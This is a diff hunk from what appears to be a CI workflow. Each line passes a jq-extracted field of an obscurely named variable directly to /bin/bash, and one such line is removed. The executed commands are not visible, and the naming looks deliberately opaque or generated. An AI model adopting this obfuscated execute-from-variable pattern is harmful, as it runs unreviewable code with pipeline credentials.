@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$zm78" | jq -r .s43986 | /bin/bash
           echo $puf00 | jq -r .ps35850 | /bin/bash
           echo $rrp31 | jq -r .ygxfj2916 | /bin/bash
-          echo $s73068 | jq -r .ozcxu06 | /bin/bash
           printf '%s' "$or75864" | jq -r .c8598 | /bin/bash
           printf '%s' "$xr14443" | jq -r .desv4 | /bin/bash
           printf '%s' "$wr11" | jq -r .axx85588 | /bin/bash
